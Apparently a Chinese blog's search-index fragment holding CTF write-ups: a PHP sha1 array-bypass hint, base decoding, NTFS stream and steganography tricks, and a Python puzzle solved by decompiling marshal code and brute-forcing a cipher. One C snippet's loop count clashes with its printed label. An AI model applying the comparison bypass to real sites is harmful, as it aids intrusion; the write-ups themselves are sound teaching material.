        <content type="html"><![CDATA[<p>又水了一场比赛，蓝盾这次系统漏洞百出，口碑炸裂了……放出我的一些WP</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>WEB题目没记录，所以只写思路</p><h3 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h3><p>提示所在地要是在台湾，目测修改HTTP头，然而flag直接在页面了。。</p><h3 id="False"><a href="#False" class="headerlink" title="False"></a>False</h3><p>提示两个参数需要不同且sha1值相同。PHP的sha1函数对数组无用，利用数组绕过。</p><h3 id="mdzz"><a href="#mdzz" class="headerlink" title="mdzz"></a>mdzz</h3><p>平台太卡，做不了</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="base64全家桶"><a href="#base64全家桶" class="headerlink" title="base64全家桶"></a>base64全家桶</h3><p>用base64 base32 base16依次解即可</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="虚拟镜像"><a href="#虚拟镜像" class="headerlink" title="虚拟镜像"></a>虚拟镜像</h3><p>用VMware挂载磁盘，目测NTFS隐藏，利用labs看出来有文件隐藏。<br>执行notepad flag.txt:flaghidden.txt</p><h2 id="Stega"><a href="#Stega" class="headerlink" title="Stega"></a>Stega</h2><h3 id="愤怒的小鸟"><a href="#愤怒的小鸟" class="headerlink" title="愤怒的小鸟"></a>愤怒的小鸟</h3><p>提示使用outguess，直接用outguess即可</p><h3 id="空白的图片"><a href="#空白的图片" class="headerlink" title="空白的图片"></a>空白的图片</h3><p>stegsolve看有个key{},为压缩包密码，解压出gif，给gif添加头GIF8，用stegsolve查看Analyse-Frame Browser，逐帧查看可得</p><h3 id="他是什么人"><a href="#他是什么人" class="headerlink" title="他是什么人"></a>他是什么人</h3><p>foremost就行</p><h2 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h2><h3 id="求最大循环次数"><a href="#求最大循环次数" class="headerlink" title="求最大循环次数"></a>求最大循环次数</h3><pre><code class="python">def cnt(n):   cnt = 1   while(n != 1):       if n%2 == 0:           n = int(n/2)       else:           n = 3*n + 1       cnt += 1       # print(n)   return cntm = 0for i in range(900, 1001):   c = cnt(i)   m = c if c&gt;m else mprint(m)</code></pre><h3 id="求素数"><a href="#求素数" class="headerlink" title="求素数"></a>求素数</h3><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main() {    int start = 367;    int diff = 186;    // 判断输入的数值，是否是素数    int isPrime(int digit) {        int sq = sqrt(digit);        for (int i = 2; i &lt;= sq; i++) {            if (digit % i == 0) {                return 0;            }        }        return 1;    }    int count = 0;  //存储找到的素数的个数    int current = start; //存储等差数列的当前值    while (1) {        if (isPrime(current)) {            count += 1;            if(count == 151) break;        }        current += diff;    }    printf(&quot;第154个素数是: %d&quot;, current);}</code></pre><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="http://pan.baidu.com/s/1i5lCHUl" target="_blank" rel="noopener">http://pan.baidu.com/s/1i5lCHUl</a> 密码：ob08</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>you_need_python_by_sunnyelf题解</title>
      <link href="20170823/%5BCTF%5Dyou_need_python_by_sunnyelf.html"/>
      <url>20170823/%5BCTF%5Dyou_need_python_by_sunnyelf.html</url>
      
        <content type="html"><![CDATA[<p>今天碰到了一个比较有意思的综合题目，记下来给大家看看。</p><a id="more"></a><p>题目和脚本地址：you_need_python_by_sunnyelf<br>解压zip有两个文件，一个是flag.py，一个是key_is_here_but_do_you_know_rfc4042。<br>首先第一步看提示rfc4042的文件，查询可得，它是utf9或者是utf18的编码。在github上找到utf9解码的库，代码如下：</p><pre><code class="python">import utf9dt = &#39;&#39;with open(&#39;key_is_here_but_do_you_know_rfc4042&#39;, &#39;r&#39;) as f:    t = f.read()    dt = utf9.utf9decode(t)print dt</code></pre><p>解出为</p><pre><code>_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___</code></pre><p>刚开始还以为是类似brainfuck之类的东西，但是观察到有括号和运算符，于是猜测是不是下划线的个数代表数字，验证了一下结果是正确的。运算之后得到了一串数字，应该为key。</p><pre><code class="python"># 似乎不能直接u&#39;_&#39;会验证不出来，因此用dt[0]代替ul = dt[0]cnt = 0ns = &#39;&#39;for i in dt:    if i is ul:        cnt += 1    else:        if cnt != 0:            ns += str(cnt)            cnt = 0            ns += i        else:            ns += i# addns += str(cnt)ns = ns.replace(&#39;//&#39;, &#39;/&#39;)print nskey = eval(ns)print key# 5287002131074331513 key</code></pre><p>第二步是难点，看marshal.loads()应该处理之后的是编译后的二进制流，查阅资料 <a href="http://www.cnblogs.com/rainduck/p/3524557.html" target="_blank" rel="noopener">http://www.cnblogs.com/rainduck/p/3524557.html</a> 找到反编译的方法，因此用uncompyle2是最好不过的了，反编译得出py文件。</p><pre><code class="python">import marshal, zlib, base64bs = marshal.loads(zlib.decompress(base64.b64decode(&#39;eJxtVP9r21YQvyd/ieWm66Cd03QM1B8C3pggUuzYCSWstHSFQijyoJBhhGq9OXJl2ZFeqAMOK6Q/94f9Ofvn1s+d7Lgtk/3O997du/vc584a0eqpYP2GVfwDEeOrKCU6g2LRRyiK4oooFsVVUSqkqxTX6J1F+SfSNYrrdKPorC76luhbpOEGCZNFZw2KG3Rmk26QtuXi3xTb7ND6/aVu0g2RuvhEcZNut5lAGbTvAFbyH57TkYLKy8J6xpDvQxiiiaIlcdqJxVcHbXY6bXNlZgviPCrO0+StqfKd88gzNh/qRZyMdWHE29TZZvIkG7eZFRGGRcBmsXJaUoKCQ9fWKHwSqNeKFnsM5PnwJ7q2aKk4AFhcWtQCh+ChB5+Lu/RmyYUxmtOEYxas7i/2iuR7Ti14OEOSmU0RADd4+dQzbM1FJhukAUeQ+kZROuLyioagrau76kc1slY1NNaY/y3LAxDQBrAICJisV2hMdF2lxQcyFuMoqcX3+TCl6xotqzSpkqmxYVmjXVjAXiwBsEfBrd1VvTvLCj2EXRnhoryAKdpxcIgJcowUB68yAx/tlCAuPHqDuZo0CN3CUGHwkPhGMA7aXMfphjbmQLhLhJcHa0a+mpgB191c1U1lnHJQbgkHx+WGxeJbejnpkzSavo2jkxZ7i725npGAaTc8FXmUjbUETHUmkxXN5zqL5WiWxwE7Bc11yyYzNJpN02jerq+DzNNodfxOX8kE4FcmYKscDdYD1oPGGucXYNmgs1F+NTf3GOt3Mg7b+NTVruqoQyX1hOEUacKw+AGbP38ZOq9THRXaSbL5pXGQ8bho/Z/lrzQaHxdoCrlev+t6nZ7re57r+57rHXag93Deh37k+vuw9zorO/Qj/B50cAf2oyOsvut3D+ADWxdxfN/1Drqu39mHzvcRswv/Hvz7sHeg9w8Qzy99DzuFwxhPhs6zWTbOI3OZRiaZZcVj5wVwOklx7OwVxR47PR46r/SVM8ulBJic9zku/eqY/MqJxiDj+Gd55wS3f35pbLCzHoEwzKKpDkN5i+TR+1AYCWTo5IV0Z0P9H3phDDd6lMzPdS5bbo9eJGbTsW9nbDqLL1N9Iq+rRxDbll2x67a9Lf27hw5uK1s1rZr6DOPF+FI=&#39;)))import uncompyle2with open(&#39;f.py&#39;, &#39;w&#39;) as f:    uncompyle2.uncompyle(&#39;2.7&#39;, bs, f)看encrypt函数，加密方法如下：def encrypt(plain, key):    keySHA1 = sha1(key)    intSHA1 = calc(keySHA1)    r = []    for i in range(len(plain)):        r.append(ord(plain[i]) + int(&#39;0x%s&#39; % keySHA1[i % 40], 16) - intSHA1)        intSHA1 = calc(sha1(plain[:i + 1])[:20] + sha1(str(intSHA1))[:20])    return &#39;&#39;.join(map(lambda x: str(x), r))</code></pre><p>对key进行sha1加密为16进制串，再处理为10进制串保存到intSHA1；<br>对plain里面的每一位ascii编码与keySHA1的某位进行相加后减去intSHA1，放入r中；<br>intSHA1变化为plain前i位的sha1前二十位与intSHA1的SHA1前二十位相加的十进制值；<br>将r中的元素转化为字符串得到加密后的字符串，因此，该加密方法是前后字符关联的，第n位的加密都与前n-1位有关。<br>了解了加密方法后，接下来尝试用第一步爆出的key爆破，爆破代码如下：</p><pre><code class="python">...if __name__ == &#39;__main__&#39;    cipherText = &#39;-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164&#39;    key = &#39;5287002131074331513&#39;    flag =&#39;&#39;    for i in range(len(cipherText)/4):        for j in range(31, 128):   # 一般31-128才是常用字符            if encrypt(flag+chr(j), key) == cipherText[0:i*4+4]:                print j,                flag += chr(j)                break    print flag发现爆破出的都是无意义字符串，猜想是否key有问题，尝试将key转换为16进制、16进制转字符串发现有意义字符串I_4m-k3yhk = hex(key)[2:]print hkkk = &#39;&#39;for i in range(len(hk)/2):    kk += chr(int(&#39;0x&#39; + hk[i*2:i*2+2], 16))print kk</code></pre><p>将key代入爆破代码即可解出flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 加解密 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于我</title>
      <link href="about/index.html"/>
      <url>about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="WhoAmI"><a href="#WhoAmI" class="headerlink" title="WhoAmI"></a>WhoAmI</h2><ul><li>热爱网络安全的同学，熟悉<strong>渗透测试</strong>、流量分析</li><li>四非大学 <strong>UJS</strong> 本科 18 应届毕业生</li><li>CTF 划水队员，获得过一些<em>说大不大说小不小</em>的奖项</li><li>Python/Go 爱好者，熟练 Python <del>的安装和卸载</del></li><li>偶尔玩玩前端，有一些前端的踩坑经历</li></ul><h2 id="Work"><a href="#Work" class="headerlink" title="Work"></a>Work</h2><ul><li>无实习经历，喜欢搞这搞那</li><li>曾就职中国移动，目前位于深圳某创业公司，负责甲方安全与爬虫 </li></ul><h2 id="Contact-Me"><a href="#Contact-Me" class="headerlink" title="Contact Me"></a>Contact Me</h2><ul><li>Mail: <a href="mailto://leezj9671@gmail.com" target="_blank" rel="noopener">GMail</a></li><li>QQ: R000REdPSlRHVVpUUU1aWUdNWVRHT0pUR1laVEk9PT0</li><li>Location: 广东深圳</li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签云</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>时间轴</title>
      <link href="timeline/index.html"/>
      <url>timeline/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
